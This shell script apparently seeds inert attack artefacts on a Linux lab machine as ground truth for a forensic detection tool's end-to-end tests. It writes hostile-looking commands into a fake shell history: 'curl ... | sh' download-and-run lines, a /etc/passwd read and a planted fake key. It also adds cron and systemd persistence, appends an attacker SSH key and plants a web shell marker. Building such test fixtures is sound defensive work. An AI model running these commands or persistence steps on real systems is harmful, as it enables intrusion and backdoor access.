#!/bin/sh
# Plant known, inert artefacts on a Linux target so E2E tests have ground truth.
# Nothing here executes anything malicious: the "payloads" are text that matches
# Rivendell's sample YARA rules, keywords and IOC extraction. Network indicators
# use the RFC 5737 / RFC 2606 documentation ranges (198.51.100.0/24, .test).
set -eu

H=/home/gandalf
mkdir -p "$H/.ssh" /tmp/.x /var/www/html /etc/rivendell-lab /etc/systemd/system /etc/cron.d /var/log

# T1059.004 / T1105: shell history with download-and-run.
cat > "$H/.bash_history" <<'EOF'
id
uname -a
cat /etc/passwd
wget http://update.rivendell-lab.test/stage2.sh -O /tmp/.x/update.sh
chmod +x /tmp/.x/update.sh
curl http://198.51.100.23:8080/beacon | sh
echo "api_key=AKIAEXAMPLELAB00000000" >> /tmp/.x/notes.txt
history -c
EOF

# T1053.003: cron persistence.
echo '*/5 * * * * root /tmp/.x/update.sh >/dev/null 2>&1' > /etc/cron.d/lab-update
chmod 0644 /etc/cron.d/lab-update

# T1543.002: systemd service persistence (unit file only; never enabled).
cat > /etc/systemd/system/lab-sync.service <<'EOF'
[Unit]
Description=Lab sync helper
[Service]
ExecStart=/tmp/.x/update.sh
Restart=always
[Install]
WantedBy=multi-user.target
EOF

# T1098.004: an extra authorized key (public half only; the private key is discarded).
ssh-keygen -q -t ed25519 -N '' -C 'attacker@rivendell-lab.test' -f /tmp/labkey
cat /tmp/labkey.pub >> "$H/.ssh/authorized_keys"
rm -f /tmp/labkey /tmp/labkey.pub

# Hidden staging directory with a script that matches Suspicious_Network_Activity.
cat > /tmp/.x/update.sh <<'EOF'
#!/bin/sh
# rivendell-lab inert payload: prints, never connects
echo "wget http://c2.rivendell-lab.test/next"
echo "contact 198.51.100.23:4444"
EOF
chmod 0755 /tmp/.x/update.sh
printf 'password=Winter2026!\nsecret token for lab\n' > /tmp/.x/notes.txt

# T1505.003: web shell marker (static text, not a working shell).
cat > /var/www/html/status.php <<'EOF'
<?php /* rivendell-lab web shell marker: powershell -enc bypass hidden */ echo "ok"; ?>
EOF

# Fake auth log with a brute force then success from a documentation address.
i=1
while [ $i -le 20 ]; do
  echo "Oct 24 03:1$((i % 10)):0$((i % 10)) lab sshd[10$i]: Failed password for root from 198.51.100.77 port 5$i ssh2" >> /var/log/auth.log
  i=$((i + 1))
done
echo "Oct 24 03:20:00 lab sshd[1999]: Accepted password for gandalf from 198.51.100.77 port 50999 ssh2" >> /var/log/auth.log

chown -R gandalf:gandalf "$H" 2>/dev/null || chown -R gandalf "$H"
chmod 700 "$H/.ssh"
chmod 600 "$H/.ssh/authorized_keys"

# Ground truth for the E2E checks (copied off the target by lab.sh).
cat > /etc/rivendell-lab/expected.json <<'EOF'
{
  "seeded": [
    {"path": "/home/gandalf/.bash_history", "attack": "T1059.004", "expect": ["wget http", "curl http", "198.51.100.23"]},
    {"path": "/etc/cron.d/lab-update", "attack": "T1053.003"},
    {"path": "/etc/systemd/system/lab-sync.service", "attack": "T1543.002"},
    {"path": "/home/gandalf/.ssh/authorized_keys", "attack": "T1098.004", "expect": ["attacker@rivendell-lab.test"]},
    {"path": "/tmp/.x/update.sh", "attack": "T1105", "yara": ["Suspicious_Network_Activity"]},
    {"path": "/tmp/.x/notes.txt", "keywords": ["password", "secret", "api_key"]},
    {"path": "/var/www/html/status.php", "attack": "T1505.003", "yara": ["Suspicious_PowerShell_Command"]},
    {"path": "/var/log/auth.log", "attack": "T1110.001", "expect": ["198.51.100.77"]}
  ],
  "iocs": ["198.51.100.23", "198.51.100.77", "c2.rivendell-lab.test", "update.rivendell-lab.test"]
}
EOF
